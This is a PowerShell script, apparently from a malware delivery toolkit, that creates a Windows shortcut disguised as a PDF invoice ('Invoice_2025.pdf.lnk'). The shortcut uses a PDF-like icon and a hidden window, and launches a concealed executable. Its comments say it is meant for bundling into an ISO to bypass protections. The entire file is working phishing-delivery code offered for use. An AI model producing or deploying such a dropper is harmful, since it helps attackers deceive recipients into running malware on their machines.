# CreatePayloadLNK.ps1 - Create proper LNK for ISO bypass
# Run this on Windows to generate the LNK, then bundle into ISO

param(
    [string]$TargetExe = "~$data.tmp",
    [string]$OutputLnk = "Invoice_2025.pdf.lnk",
    [string]$IconPath = "C:\Windows\System32\imageres.dll",
    [int]$IconIndex = 19,  # PDF-like icon
    [string]$Description = "Open Document"
)

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($OutputLnk)

# Target is relative - the hidden EXE
$Shortcut.TargetPath = "%CD%\$TargetExe"
$Shortcut.WorkingDirectory = "%CD%"
$Shortcut.Description = $Description
$Shortcut.IconLocation = "$IconPath,$IconIndex"
$Shortcut.WindowStyle = 7  # Hidden

$Shortcut.Save()

Write-Host "[+] Created: $OutputLnk -> $TargetExe"
